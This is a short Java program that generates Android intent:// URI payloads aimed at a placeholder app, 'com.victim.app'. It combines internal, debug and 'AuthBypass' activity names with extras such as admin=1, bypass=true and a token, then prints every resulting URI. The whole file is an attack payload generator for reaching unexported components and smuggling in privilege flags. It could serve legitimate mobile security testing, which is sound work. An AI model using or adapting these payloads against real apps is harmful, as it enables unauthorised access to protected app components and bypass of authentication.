import java.util.*;

public class IntentUriFuzzer {

    public static void main(String[] args) {
        String targetPackage = "com.victim.app";
        String[] components = {
            ".InternalActivity",
            ".DebugActivity",
            ".AuthBypassActivity"
        };

        Map<String, String> extras = new HashMap<>();
        extras.put("admin", "1");
        extras.put("bypass", "true");
        extras.put("token", "secret123");

        List<String> payloads = new ArrayList<>();

        for (String component : components) {
            for (Map.Entry<String, String> extra : extras.entrySet()) {
                StringBuilder sb = new StringBuilder();
                sb.append("intent://dummy#Intent;");
                sb.append("scheme=myapp;");
                sb.append("package=").append(targetPackage).append(";");
                sb.append("component=").append(targetPackage).append("/").append(component).append(";");
                sb.append("S.").append(extra.getKey()).append("=").append(extra.getValue()).append(";");
                sb.append("end");

                payloads.add(sb.toString());
            }
        }

        System.out.println("=== Generated intent:// payloads ===");
        for (String p : payloads) {
            System.out.println(p);
            System.out.println();
        }
    }
}
